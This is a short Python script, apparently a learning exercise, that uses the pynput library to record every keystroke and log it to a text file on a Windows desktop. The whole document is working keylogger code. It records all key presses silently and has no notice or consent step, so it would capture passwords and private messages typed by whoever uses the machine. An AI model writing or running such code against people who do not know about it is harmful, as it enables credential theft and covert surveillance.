from pynput.keyboard import Key, Listener
import logging

log_dir = "C:/Users/NEHA SUNIL SAWANT/Desktop/ethkey"

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG)

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
